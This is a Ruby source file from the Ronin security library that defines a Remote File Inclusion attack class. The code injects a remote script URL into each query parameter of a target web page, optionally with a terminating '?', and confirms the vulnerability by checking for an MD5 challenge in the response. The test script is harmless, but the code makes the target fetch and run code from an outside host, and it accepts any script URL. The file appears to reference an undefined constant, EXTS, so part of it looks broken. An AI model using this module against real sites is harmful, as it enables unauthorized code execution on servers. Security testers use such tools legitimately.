#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/attacks/web'

require 'digest/md5'
require 'chars'

module Ronin
  module Attacks
    #
    # Represents Remote File Inclusion (RFI) attacks.
    #
    # @since 1.0.0
    #
    class RFI < Web

      # Default URL of the RFI Test script
      TEST_SCRIPTS = {
        :php => URI('http://ronin-ruby.github.com/downloads/rfi_test.php')
      }

      # The script extensions and their languages
      SCRIPT_EXTS = {
        '.asp'  => 'asp',
        '.aspx' => 'asp',
        '.cfm'  => 'coldfusion',
        '.cfml' => 'coldfusion',
        '.jsp'  => 'jsp',
        '.php'  => 'php',
        '.pl'   => 'perl',
      }

      # Whether to terminate the RFI script url with a null byte
      property :terminate, Boolean

      # The language used by the script located at the URL
      property :script_language, String, :length  => 10,
                                         :set     => EXTS.values.uniq,
                                         :default => proc { |rfi,property|
                                           if self.url.path
                                             EXTS[File.extname(rfi.url.path)]
                                           end
                                         }

      #
      # Tests the URL for RFI attacks.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @return [RFI]
      #   The first discovered RFI vulnerability.
      #
      # @api public
      #
      def self.test(uri,options={})
        uri = URI(uri.to_s) unless uri.kind_of?(URI)
        url = URL.from(uri)

        uri.query_params.each do |name,value|
          rfi = new(options.merge(
            :url           => url,
            :query_param   => name,
            :original_data => value
          ))

          return rfi if rfi.vulnerable?
        end

        return nil
      end

      #
      # Injects the script into the original value of the query param.
      #
      # @param [URI::HTTP, String] script_url
      #   The URL of the script to inject.
      #
      # @return [String]
      #   The value of the query param, with the script URL injected.
      #
      # @api semipublic
      #
      def inject(script_url)
        if terminate?
          "#{script_url}?"
        else
          script_url.to_s
        end
      end

      #
      # Builds the attack URI.
      #
      # @param [URI::HTTP, String] script_url
      #   The URL of the script to include.
      #
      # @param [Hash] params
      #   Additional query params to include into the attack URI.
      #
      # @return [URI::HTTP]
      #   The URI for the attack.
      #
      # @api semipublic
      #
      def attack_uri(script_uri,params={})
        uri = super(script_uri)

        # always merge any specified params
        uri.query_params.merge!(params)

        return uri
      end

      #
      # Builds the attack headers.
      #
      # @param [URI::HTTP, String] script_uri
      #   The URL of the script to include.
      #
      # @param [Hash] params
      #
      # @return [Hash{String => String}]
      #   The headers for the attack.
      #
      # @api semipublic
      #
      def attack_headers(script_uri,params={})
        # let attack_uri handle the params
        super(script_uri)
      end

      #
      # Tests the RFI Attack using a specific scripting language.
      #
      # @param [Symbol, String] name
      #   The name of the language. May be either:
      #
      #   * `:asp`
      #   * `:coldfusion`
      #   * `:jsp`
      #   * `:php`
      #   * `:perl`
      #
      # @return [Boolean]
      #   Specifies whether the RFI Attack succeeded using the specified
      #   scripting language.
      #
      # @raise [NotImplementedError]
      #   The specified language is not yet supported.
      #
      def test_language(name)
        name = name.to_sym

        unless TEST_SCRIPTS.has_key?(name)
          raise(NotImplementedError,"unable to test language: #{name}")
        end

        test_script = TEST_SCRIPTS[name]

        challenge = Chars.alpha.random_string(10)
        expected  = Digest::MD5.hexdigest(challenge)
        response  = exploit!(test_script, :test => challenge)

        return response.body.include?(expected)
      end

      #
      # Tests whether the URL and query parameter are vulnerable to RFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to RFI.
      #
      # @api public
      #
      def vulnerable?
        if script_language
          # we already know what language the targetted script is using
          return test_language(script_language)
        end

        # if we don't know which language the targetted script is using,
        # test them all until one works.
        TEST_SCRIPTS.each_key do |lang|
          if test_language(lang)
            self.script_language = lang
            return true
          end
        end
        
        return false
      end

    end
  end
end
